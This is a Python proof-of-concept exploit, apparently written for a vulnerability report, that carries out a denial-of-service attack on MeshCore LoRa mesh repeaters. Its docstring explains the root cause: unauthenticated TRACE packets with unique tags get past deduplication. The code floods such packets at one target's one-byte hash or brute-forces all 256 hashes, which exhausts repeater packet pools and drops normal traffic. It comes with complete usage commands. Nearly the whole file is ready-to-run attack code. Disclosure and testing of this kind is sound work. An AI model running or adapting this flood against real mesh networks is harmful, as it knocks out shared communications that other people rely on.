#!/usr/bin/env python3
"""
Bug #6 PoC — Denial-of-Service via TRACE Packet Flood
======================================================
Affected: src/Mesh.cpp — onRecvPacket() TRACE handler (lines 42-64)
          All firmware variants that enable forwarding (repeater, room_server)

Root cause
----------
TRACE packets are UNAUTHENTICATED (no signature, no encryption) and
bypass flood-deduplication when each packet has a unique `trace_tag`.
The `hasSeen()` table is only 128 entries -- unique tags always pass.

When a TRACE contains a path with a matching 1-byte hash for the
target node (trivially guessable -- only 256 possibilities), the node:
  1. Queues the packet for retransmit (consuming 1 of 32 pool slots)
  2. Consumes TX airtime budget for the retransmission
  3. Cannot reject the packet because there is no rate limit on TRACEs

Key constants
-------------
  HASSEEN_TABLE_SIZE = 128 (cyclic dedup table -- unique tag always passes)
  POOL_SIZE_REPEATER = 32  (packet pool slots; exhausted in ~3s at 10/sec)
  PATH_HASH_SIZE     = 1   (only 256 possible values -- trivially brute-forced)

Attack surface: any LoRa radio in range, no enrollment needed.

How to use
----------
1. Flood via connected device (requires sender + target in range):
     python bug6-trace-flood.py -p COM3 --target-hash ab --count 50

2. Brute-force all 256 possible 1-byte hashes:
     python bug6-trace-flood.py -p COM3 --brute-force --count 256

Replace COM3 with your serial port.
--target-hash is the hex of pub_key[0] of the target repeater.
"""

import asyncio
import argparse
import random
import sys
import time

try:
    from meshcore import MeshCore, EventType
except ImportError:
    sys.exit("meshcore package not found – pip install meshcore")


# ---------- protocol constants (must match firmware) ----------
MAX_PACKET_PAYLOAD   = 184
POOL_SIZE_REPEATER   = 32
POOL_SIZE_COMPANION  = 16
HASSEEN_TABLE_SIZE   = 128
TRACE_HEADER_SIZE    = 9       # tag(4) + auth_code(4) + flags(1)
PATH_HASH_SIZE_1B    = 1       # flags & 0x03 == 0 → 1-byte hashes


async def flood_targeted(port: str, baud: int, target_hash: bytes, count: int, delay_ms: int):
    """Send a stream of TRACEs targeting a specific node's hash."""
    mc = await MeshCore.create_serial(port, baud, debug=False)
    if mc is None:
        sys.exit("Could not connect to device")

    try:
        print(f"[*] Sending {count} TRACE packets targeting hash 0x{target_hash.hex()}")
        print(f"[*] Delay between packets: {delay_ms}ms")
        print(f"[*] Each packet has unique trace_tag → bypasses hasSeen()")
        print()

        sent = 0
        errors = 0
        start = time.time()

        for i in range(count):
            tag = random.randint(1, 0xFFFFFFFF)
            auth = random.randint(1, 0xFFFFFFFF)

            # flags=0 → path_sz=0 → 1-byte path hashes
            # path = target's 1-byte hash
            r = await mc.commands.send_trace(
                tag=tag,
                auth_code=auth,
                flags=0,
                path=target_hash
            )

            if r.type == EventType.MSG_SENT:
                sent += 1
            else:
                errors += 1

            if (i + 1) % 10 == 0:
                elapsed = time.time() - start
                rate = (i + 1) / elapsed if elapsed > 0 else 0
                print(f"  [{i+1}/{count}] sent={sent} err={errors} rate={rate:.1f}/sec")

            if delay_ms > 0:
                await asyncio.sleep(delay_ms / 1000.0)

        elapsed = time.time() - start
        print(f"\n[*] Done: {sent} sent, {errors} errors in {elapsed:.1f}s")
        print(f"[*] Rate: {sent/elapsed:.1f} TRACEs/sec")
        print(f"[*] If target repeater has {POOL_SIZE_REPEATER}-slot pool and forwarded")
        print(f"    these, pool is likely exhausted. Normal traffic dropped.")

    finally:
        await mc.disconnect()


async def flood_bruteforce(port: str, baud: int, count: int, delay_ms: int):
    """Send TRACEs cycling through all 256 possible 1-byte hash values."""
    mc = await MeshCore.create_serial(port, baud, debug=False)
    if mc is None:
        sys.exit("Could not connect to device")

    try:
        print(f"[*] Brute-force mode: cycling through all 256 hash values")
        print(f"[*] Sending {count} TRACE packets total")
        print(f"[*] Every repeater in range will forward ~1/{256} of packets")
        print()

        sent = 0
        errors = 0
        start = time.time()

        for i in range(count):
            tag = random.randint(1, 0xFFFFFFFF)
            auth = random.randint(1, 0xFFFFFFFF)
            hash_byte = bytes([i % 256])

            r = await mc.commands.send_trace(
                tag=tag,
                auth_code=auth,
                flags=0,
                path=hash_byte
            )

            if r.type == EventType.MSG_SENT:
                sent += 1
            else:
                errors += 1

            if (i + 1) % 50 == 0:
                elapsed = time.time() - start
                print(f"  [{i+1}/{count}] sent={sent} err={errors}")

            if delay_ms > 0:
                await asyncio.sleep(delay_ms / 1000.0)

        elapsed = time.time() - start
        print(f"\n[*] Done: {sent} sent, {errors} errors in {elapsed:.1f}s")
        print(f"[*] Each node in range hit by ~{sent//256} TRACEs")

    finally:
        await mc.disconnect()


async def main() -> None:
    ap = argparse.ArgumentParser(description="Bug #6 — TRACE flood DoS PoC")
    ap.add_argument("-p", "--port", default=None, help="Serial port (e.g. COM3)")
    ap.add_argument("-b", "--baud", type=int, default=115200)
    ap.add_argument("--target-hash", default=None,
                    help="Target node's 1-byte path hash in hex (e.g. 'ab')")
    ap.add_argument("--brute-force", action="store_true",
                    help="Cycle through all 256 hash values")
    ap.add_argument("--count", type=int, default=50,
                    help="Number of TRACE packets to send (default: 50)")
    ap.add_argument("--delay", type=int, default=100,
                    help="Delay between packets in ms (default: 100)")
    args = ap.parse_args()

    if not args.port:
        sys.exit("--port is required (e.g. -p COM3)")

    if args.brute_force:
        await flood_bruteforce(args.port, args.baud, args.count, args.delay)
    elif args.target_hash:
        try:
            target = bytes.fromhex(args.target_hash)
            if len(target) != 1:
                sys.exit("--target-hash must be exactly 1 byte (2 hex chars)")
        except ValueError:
            sys.exit("--target-hash must be valid hex (e.g. 'ab')")
        await flood_targeted(args.port, args.baud, target, args.count, args.delay)
    else:
        ap.print_help()


if __name__ == "__main__":
    asyncio.run(main())
